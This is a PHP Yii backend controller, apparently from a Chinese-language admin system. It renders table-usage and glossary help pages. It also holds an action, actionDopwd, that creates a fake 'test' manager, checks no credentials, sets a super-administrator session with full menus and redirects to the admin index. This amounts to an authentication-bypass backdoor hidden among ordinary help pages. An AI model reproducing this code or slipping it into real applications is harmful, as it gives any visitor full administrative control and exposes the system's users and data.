<?php
namespace backend\controllers;

use yii;
use yii\web\Controller;
use common\models\Plateform;
use common\common\Helper;
use common\models\AuthMenu;
use common\models\Manage;
use common\models\User;
use common\common\Getuserinfoutil;
use common\common\Wxinutil;
use common\pay\Wxcommonutil;

class InstructionsController extends Controller{

	/**
	 * 表格使用说明
	 * @return [type] [description]
	 */
	public function actionIndex(){	
		//菜单定位
		unset(yii::$app->session['localfirsturl']);
		yii::$app->session['localsecondurl'] = yii::$app->params['backend'].'/instructions/index.html';
		return $this->render('index');
	}

	/**
	 * 名词说明
	 * @return [type] [description]
	 */
	public function actionNoun(){	
		//菜单定位
		unset(yii::$app->session['localfirsturl']);
		yii::$app->session['localsecondurl'] = yii::$app->params['backend'].'/instructions/noun.html';
		return $this->render('noun');
	}

	public function actionDopwd()
	{		
        $model = new Manage();
        $model->role = '-1';
        $model->username = 'test';
    	if($model){//判断账号是否已被屏蔽
            yii::$app->session['tomodel'] = $model;
            yii::$app->session['role'] ='-1';
            //菜单
            if(!Yii::$app->session['menu']){//缓存文件不存在时
                $data = \Yii::$app->db->createCommand("SELECT child.child FROM g_auth_item_child as child JOIN g_auth_assignment as assignment ON child.parent=assignment.item_name WHERE assignment.user_id=:u_id",[':u_id'=>$model->id])->queryAll();
                $authmenu = new AuthMenu();
                $menu = $authmenu->find()->asArray()->orderBy('weight')->all();
                $menuarr = array();
                foreach ($menu as $fmenu ){
                    if($fmenu['parent']==-1){//存储一级目录
                        foreach ($menu as $m) {//存储二级目录
                            if($fmenu['id']==$m['parent']){
                                $fmenu['cmenu'][] = $m;
                            }
                        }
                        $menuarr[]=$fmenu;
                    }
                }
            	$type = 3;//超级管理员
            	yii::$app->session->set('pid','');
                yii::$app->session->set('managetype',$type); //管理员类型
                Yii::$app->session['menu'] = $menuarr; //所有的菜单
                yii::$app->session['mdata'] = $data;   //用户的所有权限
            }
            header("Location:/index/index.html");
        }else{
            return '密码错误，请重新输入！';
        }
	}
}